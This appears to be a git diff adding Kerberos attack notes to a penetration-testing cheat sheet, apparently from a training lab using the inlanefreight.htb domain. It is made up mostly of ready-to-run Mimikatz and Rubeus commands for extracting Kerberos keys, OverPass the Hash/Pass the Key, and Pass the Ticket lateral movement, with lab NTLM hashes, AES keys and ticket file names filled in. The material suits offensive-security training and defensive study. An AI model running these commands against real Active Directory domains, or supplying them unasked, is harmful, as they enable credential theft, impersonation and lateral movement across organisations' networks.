@@ -172,3 +172,58 @@ Rubeus - Export Tickets
 ```
 Rubeus.exe dump /nowrap
 ```
+
+> This is a common way to retrieve tickets from a computer. Another advantage of abusing Kerberos tickets is the ability to forge our own tickets. Let's see how we can do this using the OverPass the Hash or Pass the Key technique.
+
+## Pass the Key or OverPass the Hash
+
+The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT).
+
+Mimikatz - Extract Kerberos Keys
+```
+sekurlsa::ekeys
+```
+
+Mimikatz - Pass the Key or OverPass the Hash
+```
+sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+```
+
+Rubeus - Pass the Key or OverPass the Hash
+```
+Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+```
+> Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.
+
+## Pass the Ticket (PtT)
+
+Rubeus Pass the Ticket
+```
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
+```
+
+Rubeus - Pass the Ticket
+```
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+```
+
+Mimikatz - Pass the Ticket
+```
+kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+```
+
+Mimikatz - Pass the Ticket for Lateral Movement.
+```
+kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+```
+
+Rubeus - PowerShell Remoting with Pass the Ticket
+```
+Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+```
+
+Rubeus - Pass the Ticket for Lateral Movement
+```
+Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
+```
+
